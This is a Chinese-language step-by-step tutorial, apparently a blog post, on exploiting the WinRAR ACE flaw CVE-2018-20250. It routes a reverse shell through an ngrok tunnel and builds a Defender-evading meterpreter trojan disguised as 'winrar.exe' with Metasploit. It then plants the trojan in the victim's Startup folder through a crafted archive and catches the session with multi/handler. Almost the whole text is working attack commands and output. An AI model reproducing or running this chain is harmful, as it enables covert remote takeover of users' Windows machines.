## Ngrok版

### 1、开通隧道

```
隧道协议：tcp
隧道名称：随意
远程端口：查看可用端口   //此处我是买的
本地端口：192.168.79.138:7777    //192.168.79.138是kali的ip, 7777为自定义端口
```

kali运行ngrok

```linux
root@kali:~/linux_amd64# ./sunny clientid 142611190464
Sunny-Ngrok   官 网 www.ngrok.cc                                                           
(Ctrl+C 退 出 )
Tunnel Status                 online                                              
Version                       2.1/2.1                                                    
Forwarding                    tcp://viphk.ngrok.org:10015 -> 192.168.79.138:7777         
Web Interface                 127.0.0.1:4040                                             
# Conn                        1                                                          
Avg Conn Time                 0.00ms                                          
```

### 2、创建木马

```
root@kali:~# msfconsole                  //检查metasploit版本，必须是5.0以上
msf5 > use evasion/windows/windows_defender_exe
msf5 evasion(windows/windows_defender_exe) > show options          //查看所需项
msf5 evasion(windows/windows_defender_exe) > set filename winrar.exe
filename => winrar.exe
msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp//加载payload
msf5 evasion(windows/windows_defender_exe) > show options
msf5 evasion(windows/windows_defender_exe) > set lhost viphk.ngrok.org //gnrok运行时地址
lhost => viphk.ngrok.org
msf5 evasion(windows/windows_defender_exe) > set lport 10015       //gnrok时启动的端口
lport => 10015
msf5 evasion(windows/windows_defender_exe) > run
[*] Compiled executable size: 4096
[+] winrar.exe stored at /root/.msf4/local/winrar.exe               //具体木马存放路径
```

### 2、CVE-2018-20250漏洞利用

漏洞影响范围

	WinRAR < 5.70 Beta 1
	Bandizip < = 6.2.0.0
	好压(2345 压缩) < = 5.9.8.10907
	360 压缩 < = 4.0.0.1170
 git下载exp

```
Administrator@L ~/Desktop $ git clone https://github.com/WyAtu/CVE-2018-20250.git
```

传输木马到python3.7环境 ,python必须使用3.7版本

```
root@kali:~# cd /root/.msf4/local/
root@kali:~/.msf4/local# python -m SimpleHTTPServer 9090
```

修改exp.py

```
evil_filename = "winrar.exe"           //第11行，winrar.exe为之前生成木马的具体名称
p = os.popen('python3 acefile.py --headers %s'%(filename)) //第50行，python3 acefile.py，我的电脑使用python3 xxx.py执行python3命令，根据具体电脑情况继续进行修改。此处十分重要！！！！！！！！！！
```

执行exp

```
C:\Users\Administrator\Desktop\CVE-2018-20250>python3 exp.py
[*] Start to generate the archive file test.rar...
test.rar: CorruptedArchiveError: header CRC failed
test.rar: CorruptedArchiveError: header CRC failed
test.rar: CorruptedArchiveError: header CRC failed
[+] Evil archive file test.rar generated successfully !
```

回到kali,重启一个终端

```
root@kali:/# msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options                      //查看选项 
msf5 exploit(multi/handler) > set lhost 192.168.79.138          //与生成木马时ip一致
lhost => 192.168.79.138
msf5 exploit(multi/handler) > set lport 7777                    //与创建隧道时端口一致
lport => 7777
msf5 exploit(multi/handler) > run                               //等待主机上线
```

在靶机解压缩之前生成的test.rar文件                                                       //解压缩软件必须处于漏洞影响范围内

检查木马是否已添加到启动项

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  
//Administrator需修改为当前登陆用户，不一定非要Administrator
```

重启靶机